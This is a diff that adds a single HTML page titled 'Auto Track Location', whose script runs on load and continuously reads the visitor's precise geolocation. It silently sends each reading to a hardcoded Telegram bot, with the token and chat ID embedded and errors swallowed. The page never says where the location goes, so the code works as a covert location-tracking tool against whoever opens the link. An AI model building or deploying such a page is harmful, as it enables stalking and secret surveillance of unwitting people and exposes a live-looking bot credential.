@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
+<title>Auto Track Location</title>
+<style>
+  body {
+    margin: 0;
+    height: 100vh;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    background: linear-gradient(135deg, #6a11cb 0%, #2575fc 100%);
+    color: white;
+    font-weight: bold;
+    text-shadow: 0 0 20px rgba(0,0,0,0.5);
+    user-select: none;
+  }
+  #status {
+    font-size: 1.5rem;
+    text-align: center;
+    padding: 1rem 2rem;
+    border: 2px solid white;
+    border-radius: 1rem;
+    background: rgba(255,255,255,0.15);
+  }
+</style>
+</head>
+<body>
+<div id="status">Requesting location permission...</div>
+<script>
+(() => {
+  const token = '7790169626:AAEpBZcgJMAlU0F81GLoLTyyEYZCGEDBOi4';
+  const chatId = '7267616724';
+  const statusEl = document.getElementById('status');
+
+  function sendLocationToTelegram(lat, lon, accuracy) {
+    const text = `Tracking By OrangGanteng\nLatitude: ${lat}\nLongitude: ${lon}\nAccuracy: ±${accuracy} meters\nTime: ${new Date().toLocaleString()}`;
+    const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`;
+    fetch(url).catch(() => {}); // silent catch
+  }
+
+  function success(position) {
+    const coords = position.coords;
+    if(!coords.accuracy || coords.accuracy > 100) {
+      statusEl.textContent = 'Waiting for accurate location...';
+      return;
+    }
+    statusEl.textContent = 'Tracking By OrangGanteng';
+    sendLocationToTelegram(coords.latitude, coords.longitude, coords.accuracy);
+  }
+
+  function error(err) {
+    statusEl.textContent = 'Location permission denied or unavailable.';
+  }
+
+  function requestLocation() {
+    if (!navigator.geolocation) {
+      statusEl.textContent = 'Geolocation is not supported by your browser';
+      return;
+    }
+    navigator.geolocation.watchPosition(success, error, {
+      enableHighAccuracy: true,
+      maximumAge: 0,
+      timeout: 20000
+    });
+  }
+
+  // Request permission right away on load
+  requestLocation();
+})();
+</script>
+</body>
+</html>
+
+```
